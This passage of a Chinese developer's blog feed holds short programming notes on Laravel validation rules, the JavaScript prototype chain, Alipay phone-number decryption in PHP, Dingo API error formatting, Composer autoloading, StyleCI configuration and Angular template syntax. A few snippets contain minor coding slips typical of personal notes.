<li><span class="exturl" data-url="aHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvMzAyMzgyODUvbGFyYXZlbC01LWhvdy10by12YWxpZGF0ZS1yb3V0ZS1wYXJhbWV0ZXJz" title="https://stackoverflow.com/questions/30238285/laravel-5-how-to-validate-route-parameters">解决思路来自<i class="fa fa-external-link"></i></span></li>
</ul>
<h3 id="2-自己定义规则"><a href="#2-自己定义规则" class="headerlink" title="2 自己定义规则"></a>2 自己定义规则</h3><p>&emsp;生成规则文件<code>php artisan make:rule GoodsMustbeExits</code>，会生成这个文件<code>App/Rules/GoodsMustbeExits</code> :<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Rules</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Contracts</span>\<span class="title">Validation</span>\<span class="title">Rule</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GoodsMustbeExits</span> <span class="keyword">implements</span> <span class="title">Rule</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a new rule instance.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Determine if the validation rule passes.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string  $attribute</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  mixed  $value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">passes</span><span class="params">($attribute, $value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the validation error message.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">message</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'//'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<p>其中<code>passes</code>方法用来定义处理的逻辑，返回 <code>boolean</code>，<code>message</code>方法则定义错误消息,<code>attribute</code>和<code>value</code> 为要验证的参数名和参数值。这是示例:<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Rules</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Contracts</span>\<span class="title">Validation</span>\<span class="title">Rule</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GoodsMustbeExits</span> <span class="keyword">implements</span> <span class="title">Rule</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a new rule instance.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Determine if the validation rule passes.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string  $attribute</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  mixed  $value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">passes</span><span class="params">($attribute, $value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $aop = <span class="keyword">$this</span>-&gt;getAopInstance();</span><br><span class="line">        $Goodes = Goods::where(<span class="string">'id'</span>, $value)</span><br><span class="line">            -&gt;where(<span class="string">'status'</span>, <span class="number">1</span>)</span><br><span class="line">            -&gt;get();</span><br><span class="line">        <span class="keyword">return</span> $Goodes-&gt;isEmpty() ? <span class="keyword">false</span> : <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the validation error message.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">message</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'这个商品不存在'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<p>然后在请求层进行验证(<code>goods_id</code>为上传的参数)<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Requests</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Http</span>\<span class="title">FormRequest</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Rules</span>\<span class="title">GoodsMustbeExits</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GenerateCreditPreOrder</span> <span class="keyword">extends</span> <span class="title">FormRequest</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">validationData</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;route()-&gt;parameters();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Determine if the user is authorized to make this request.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">authorize</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the validation rules that apply to the request.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rules</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            <span class="string">'goods_id'</span> =&gt; [<span class="string">'required'</span>, <span class="keyword">new</span> GoodsMustbeExits()]</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>laravel</tag>
        <tag>表单验证</tag>
      </tags>
  </entry>
  <entry>
    <title>【php】php学习笔记-laravelAPI全局异常设置</title>
    <url>/2019/12/12/%E3%80%90php%E3%80%91php%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-laravelAPI%E5%85%A8%E5%B1%80%E5%BC%82%E5%B8%B8%E8%AE%BE%E7%BD%AE/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>【Javascript】javascript笔记 -原型链</title>
    <url>/2019/12/10/%E3%80%90Javascript%E3%80%91javascript%E7%AC%94%E8%AE%B0-%E5%8E%9F%E5%9E%8B%E9%93%BE/</url>
    <content><![CDATA[<h4 id="1-什么是原型链？"><a href="#1-什么是原型链？" class="headerlink" title="1 什么是原型链？"></a>1 什么是原型链？</h4><p>  &emsp;在<code>javascript</code>声明一个变量，会自动继承一些属性和方法，这些都包含在<code>__proto__</code>属性和<code>__proto__</code>的<code>__proto__</code>中，从而定义好一个变量后，就能去使用它，如字符串的长度属性<code>length</code>,拼接的对象的方法<code>concat</code>等。而这些额外的属性和方法就是原型链了。那有没有纯粹的变量，没有原型链的？有的！<br>  &emsp; 用<code>let foo = Object.create(__proto__: object, {} :boject) : object</code>的方式可以定义一个无原型的对象(完全数据字典对象)，如:<br>  <div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> foo = <span class="built_in">Object</span>.create(<span class="literal">null</span>, &#123;</span><br><span class="line"> 	 name: &#123;</span><br><span class="line">      	value: <span class="string">"hello world"</span></span><br><span class="line">      &#125;</span><br><span class="line">	&#125;) : object</span><br><span class="line"> </span><br><span class="line"> <span class="built_in">console</span>.dir(foo);</span><br><span class="line"> <span class="comment">// &#123;name: "hello world"&#125;</span></span><br></pre></td></tr></table></figure></div></p>
 <a id="more"></a>
<h4 id="2，重写属性和方法"><a href="#2，重写属性和方法" class="headerlink" title="2，重写属性和方法"></a>2，重写属性和方法</h4><p> &emsp;原型链上的属性和方法在对象变量进行优先调用，如:</p>
 <div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> Foo = &#123;</span><br><span class="line">	hasOwnProperty: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="built_in">console</span>.dir(<span class="string">"transer hasOwnProperty method"</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"> Foo.hasOwnProperty(); <span class="comment">// transer hasOwnProperty method</span></span><br><span class="line"> Foo.__proto__.hasOwnProperty(<span class="string">'name'</span>); <span class="comment">// false</span></span><br></pre></td></tr></table></figure></div>
<h4 id="3-函数prototype-属性说明"><a href="#3-函数prototype-属性说明" class="headerlink" title="3 函数prototype 属性说明"></a>3 函数<code>prototype</code> 属性说明</h4><p> &emsp; <code>javascript</code> 的函数可以当既可以当函数来用，也可以当一个类的实例和初始化方法来用，而它有一个属性为<code>prototype</code>，当实例化后，这个属性就会等于下游实例化后的对象变量的<code>__proto__</code>属性。从而上游修改<code>prototyp</code>，尽管下游已经实例的内置属性和方法也会跟着改变。如： </p>
 <figure class="highlight"><table><tr><td class="code"><pre><span class="line">function foo() &#123;&#125;</span><br><span class="line">let Bar = new foo();</span><br><span class="line">foo.prototype.show = function () &#123;</span><br><span class="line">    console.dir('hello world !');</span><br><span class="line">&#125;</span><br><span class="line">Bar.show();// hello world !</span><br></pre></td></tr></table></figure>
<h4 id="4-原型链的长度和组成"><a href="#4-原型链的长度和组成" class="headerlink" title="4 原型链的长度和组成"></a>4 原型链的长度和组成</h4><p> &emsp; 在<code>javascript</code>的所有数据类型都可以看成对象，如：<br> <div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 对象</span></span><br><span class="line">  <span class="keyword">let</span> Obj = <span class="keyword">new</span> object();</span><br><span class="line">  <span class="comment">// 字符串对象</span></span><br><span class="line">  <span class="keyword">let</span> Str = <span class="keyword">new</span> string();</span><br><span class="line">  <span class="comment">// 布尔对象</span></span><br><span class="line">  <span class="keyword">let</span> Bool = <span class="keyword">new</span> boolean();</span><br><span class="line">  <span class="comment">// 正则对象</span></span><br><span class="line">  <span class="keyword">let</span> Reg = <span class="keyword">new</span> <span class="built_in">RegExp</span>();</span><br><span class="line">  <span class="comment">// 数组对象</span></span><br><span class="line">  <span class="keyword">let</span> Arr  = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br></pre></td></tr></table></figure></div></p>
<p>而每个对象或许都有2个属性<code>__proto__</code>和<code>prototype</code>，前者为自己服务即</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>原型链</tag>
      </tags>
  </entry>
  <entry>
    <title>【心情文章】学习从来就不是一件开心的事</title>
    <url>/2019/12/09/%E3%80%90%E5%BF%83%E6%83%85%E6%96%87%E7%AB%A0%E3%80%91%E5%AD%A6%E4%B9%A0%E4%BB%8E%E6%9D%A5%E5%B0%B1%E4%B8%8D%E6%98%AF%E4%B8%80%E4%BB%B6%E5%BC%80%E5%BF%83%E7%9A%84%E4%BA%8B/</url>
    <content><![CDATA[<p>&emsp;如果学习没有高考，不能帮助找到更好的工作从而改善自己的生存环境，你还会认为学习早一件快乐的事吗？不会的！学习从来就是痛苦的，它是反天性。人的天性就是喜欢享受，享受好的东西。而这些东西不是所有的人生来就有的。而为了得来这些，人们不得不训练自己，从而达到自己的目的。而这个训练就是学习。<br><a id="more"></a><br>&emsp;所以，快乐学习真较起真来，连自己都骗。</p>
]]></content>
      <categories>
        <category>心情文章</category>
      </categories>
  </entry>
  <entry>
    <title>【php】php函数摘要-加密和解密类</title>
    <url>/2019/12/08/%E3%80%90php%E3%80%91php%E5%87%BD%E6%95%B0%E6%91%98%E8%A6%81-%E8%A7%A3%E5%AF%86%E7%B1%BB/</url>
    <content><![CDATA[<h4 id="1支付宝小程序手机号解密"><a href="#1支付宝小程序手机号解密" class="headerlink" title="1支付宝小程序手机号解密"></a>1支付宝小程序手机号解密</h4><h5 id="加密数据"><a href="#加密数据" class="headerlink" title="加密数据"></a>加密数据</h5><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="JSON"><figure class="iseeu highlight /json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">"response"</span>: <span class="string">"EaieI1W9gPK0zClNbA7P0T6svaSYq/1xejihTXNVSH0WyCjBIcP2xOwaAevaYgb4aeQ5NNRQaqbZgVvfJKfaLQ=="</span>,</span><br><span class="line">	<span class="attr">"sign"</span>: <span class="string">"iSHQH/r3rZiBx7N49SwQNHx2Y0B6OP2ePvhS+T2XKw9+dzt3T1W9T0cHSldFlkczcdPQ05Pi/bEygsZxip6StCNEqse7ou/nXx9QOAVNoBgZfb4bmFJxOl8DYeuF8VKQy+NdxuvRGJFpmVynZtSNy31BfD4663IowMj80/pfnmLJCEKqoS2oHWtGRRM7oIFEdCH5IJKCsq79qxFEPwmQVid2uN0XuL/Rg+lKN9eAbTGcBttVZGaI11vGDEBUq9sNksVJXWUHofszCeD9jGz8pGoNvApRt8Swe2RnVtWcnQ+Zh+G105fPpp3RYNZBSBV9EJJ5la5IEv8KfAwjW7jGFg=="</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h5 id="解密函数"><a href="#解密函数" class="headerlink" title="解密函数"></a>解密函数</h5><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 解密</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * return mix</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decryptData</span><span class="params">(string $encrypted_data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $key = env(<span class="string">'EAS'</span>);</span><br><span class="line">    $aesKey=base64_decode($key);</span><br><span class="line">    $iv = <span class="number">0</span>;</span><br><span class="line">    $aesIV=base64_decode($iv);</span><br><span class="line">    $aesCipher=base64_decode($encrypted_data);</span><br><span class="line">    $result=openssl_decrypt( $aesCipher, <span class="string">"AES-128-CBC"</span>, $aesKey, <span class="number">1</span>, $aesIV);</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h5 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h5><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> decryptData(<span class="string">'EaieI1W9gPK0zClNbA7P0T6svaSYq/1xejihTXNVSH0WyCjBIcP2xOwaAevaYgb4aeQ5NNRQaqbZgVvfJKfaLQ=='</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#123;"code":"10000","msg":"Success","mobile":"1342XXXXXXX"&#125;</span></span><br></pre></td></tr></table></figure></div>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RpYW5kaWFueGl5dV9nZWVrL2FydGljbGUvZGV0YWlscy84NjI1MDQ5MA==" title="https://blog.csdn.net/diandianxiyu_geek/article/details/86250490">摘自<i class="fa fa-external-link"></i></span></p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>加密解密</tag>
        <tag>支付宝小程序</tag>
      </tags>
  </entry>
  <entry>
    <title>【laravel】dingo api自定义异常格式</title>
    <url>/2019/12/03/%E3%80%90laravel%E3%80%91dingo-api%E8%87%AA%E5%AE%9A%E4%B9%89%E5%BC%82%E5%B8%B8%E6%A0%BC%E5%BC%8F/</url>
    <content><![CDATA[<h4 id="dinggo-api-自定义异常格式"><a href="#dinggo-api-自定义异常格式" class="headerlink" title="dinggo api 自定义异常格式"></a>dinggo api 自定义异常格式</h4><p>在<code>app/Pviders/AppServiceProvider</code>的<code>register</code>方法加入.<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">\API::error(<span class="function"><span class="keyword">function</span> <span class="params">(\Illuminate\Validation\ValidationException $exception)</span></span>&#123;</span><br><span class="line">  $data =$exception-&gt;validator-&gt;getMessageBag();</span><br><span class="line">   $msg = collect($data)-&gt;first();</span><br><span class="line">   <span class="keyword">if</span>(is_array($msg))&#123;</span><br><span class="line">     $msg = $msg[<span class="number">0</span>];</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> response()-&gt;json([<span class="string">'message'</span>=&gt;$msg,<span class="string">'status_code'</span>=&gt;<span class="number">400</span>], <span class="number">200</span>);</span><br><span class="line"> &#125;);</span><br><span class="line"> \API::error(<span class="function"><span class="keyword">function</span> <span class="params">(\Dingo\Api\Exception\ValidationHttpException $exception)</span></span>&#123;</span><br><span class="line">   $errors = $exception-&gt;getErrors();</span><br><span class="line">   <span class="keyword">return</span> response()-&gt;json([<span class="string">'message'</span>=&gt;$errors-&gt;first(),<span class="string">'status_code'</span>=&gt;<span class="number">400</span>], <span class="number">200</span>);</span><br><span class="line"> &#125;);</span><br></pre></td></tr></table></figure></div></p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>laravel</tag>
        <tag>dingo</tag>
      </tags>
  </entry>
  <entry>
    <title>【PHP】composer使用笔记</title>
    <url>/2019/11/28/%E3%80%90PHP%E3%80%91composer%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="laravel-全局函数文件配置（摘抄）"><a href="#laravel-全局函数文件配置（摘抄）" class="headerlink" title="laravel 全局函数文件配置（摘抄）"></a>laravel 全局函数文件配置（摘抄）</h3><p>An easy and efficient way of creating a global functions file is to autoload it directly from Composer. The autoload section of composer accepts a files array that is automatically loaded.</p>
<p>Create a <code>functions.php</code> file wherever you like. In this example, we are going to create in inside <code>app/Helpers</code>.</p>
<p>Add your functions, but do not add a class or namespace.</p>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">global_function_example</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="string">'A Global Function with '</span>. $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<a id="more"></a>
<p>In <code>composer.json</code> inside the autoload section add the following line:</p>
<p><code>&quot;files&quot;: [&quot;app/Helpers/functions.php&quot;]</code><br>Example for Laravel 5:<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">"autoload": &#123;</span><br><span class="line">    "classmap": [</span><br><span class="line">        <span class="string">"database"</span></span><br><span class="line">    ],</span><br><span class="line">    "psr-4": &#123;</span><br><span class="line">        "App\\": "app/"</span><br><span class="line">    &#125;,</span><br><span class="line">    "files": ["app/Helpers/functions.php"] // &lt;-- Add this line</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></p>
<p>Run composer dump-autoload</p>
<p>Done! You may now access <code>global_function_example(&#39;hello world&#39;)</code> form any part of your application including Blade views.<br><span class="exturl" data-url="aHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvMzI0MTk2MTkvaG93LWRvLWktbWFrZS1nbG9iYWwtaGVscGVyLWZ1bmN0aW9ucy1pbi1sYXJhdmVsLTUvMzI0MjI2OTk=" title="https://stackoverflow.com/questions/32419619/how-do-i-make-global-helper-functions-in-laravel-5/32422699">来源<i class="fa fa-external-link"></i></span></p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>composer</tag>
        <tag>laravel</tag>
      </tags>
  </entry>
  <entry>
    <title>【CI/CD】代码修复工具StyleCI-文件配置</title>
    <url>/2019/11/22/%E3%80%90CI-CD%E3%80%91%E4%BB%A3%E7%A0%81%E4%BF%AE%E5%A4%8D%E5%B7%A5%E5%85%B7StyleCI-%E6%96%87%E4%BB%B6%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>&emsp; StyleCI是一个代码格式规范的工具，它的作用于<code>github</code>提交代码后，触发去分析你的代码是否符合你配置的规范格式，然后也可以回头给你<code>request pull</code>这么一个纠正的代码合并请求，起到代码格式规范的这么一道警报线。<code>StyleCI</code>默认<code>PHP</code>是免费，更多语言<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnN0eWxlY2kuaW8vY29uZmlndXJhdGlvbg==" title="https://docs.styleci.io/configuration">官方文档<i class="fa fa-external-link"></i></span>有说明。这个是我<code>laravel</code>风格的<code>.styleci.yml</code>文件内容:</p>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="YML"><figure class="iseeu highlight /yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">preset:</span> <span class="string">laravel</span></span><br><span class="line"><span class="attr">risky:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">finder:</span></span><br><span class="line">  <span class="attr">exclude:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">modules</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">node_modules</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">storage</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">vendor</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">"*.php"</span></span><br><span class="line">  <span class="attr">not-name:</span> <span class="string">"*.blade.php"</span></span><br></pre></td></tr></table></figure></div>
<p>也可以设置为<code>symfony</code>格式，更多格式也可以参考<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZyaWVuZHNPZlBIUC9QSFAtQ1MtRml4ZXI=" title="https://github.com/FriendsOfPHP/PHP-CS-Fixer">FriendsOfPHP/PHP-CS-Fixer<i class="fa fa-external-link"></i></span></p>
]]></content>
      <categories>
        <category>CI/CD</category>
      </categories>
      <tags>
        <tag>StyleCi</tag>
      </tags>
  </entry>
  <entry>
    <title>【Typescript】angular入门笔记-模板语法</title>
    <url>/2019/11/21/%E3%80%90Typescript%E3%80%91angular%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E6%A8%A1%E6%9D%BF%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<h4 id="结构指令"><a href="#结构指令" class="headerlink" title="结构指令"></a>结构指令</h4><h5 id="1-遍历指令"><a href="#1-遍历指令" class="headerlink" title="1, 遍历指令"></a>1, 遍历指令</h5><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> *<span class="attr">ngFor</span>=<span class="string">"let product of products"</span>&gt;</span> </span><br><span class="line">     &#123;&#123; product.name &#125;&#125;</span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<a id="more"></a>
<h4 id="2-流程判断指令"><a href="#2-流程判断指令" class="headerlink" title="2,流程判断指令"></a>2,流程判断指令</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> *<span class="attr">ngIf</span>=<span class="string">"product.descript"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<div class="note info">
            <p>不为空则输出</p><p></p>
          </div>
<h4 id="3-文本绑定输出"><a href="#3-文本绑定输出" class="headerlink" title="3,文本绑定输出"></a>3,文本绑定输出</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span></span><br><span class="line">	&#123;&#123; product.name &#125;&#125;      </span><br><span class="line"><span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<h4 id="4-标签属性绑定"><a href="#4-标签属性绑定" class="headerlink" title="4 标签属性绑定"></a>4 标签属性绑定</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> [<span class="attr">title</span>]=<span class="string">"product.name + 'detail'"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<h4 id="5-事件点击绑定"><a href="#5-事件点击绑定" class="headerlink" title="5,事件点击绑定"></a>5,事件点击绑定</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> (<span class="attr">click</span>)=<span class="string">"share()"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p><span class="exturl" data-url="aHR0cHM6Ly9hbmd1bGFyLmlvL2d1aWRlL3RlbXBsYXRlLXN5bnRheA==" title="https://angular.io/guide/template-syntax">更多模板语法<i class="fa fa-external-link"></i></span></p>
]]></content>
      <categories>
        <category>Typescript</category>
      </categories>
      <tags>
        <tag>angular</tag>
      </tags>
  </entry>
  <entry>
    <title>【homestead】homestead切换为国内源</title>
    <url>/2019/11/19/%E3%80%90homestead%E3%80%91homestead%E5%88%87%E6%8D%A2%E4%B8%BA%E5%9B%BD%E5%86%85%E6%BA%90/</url>
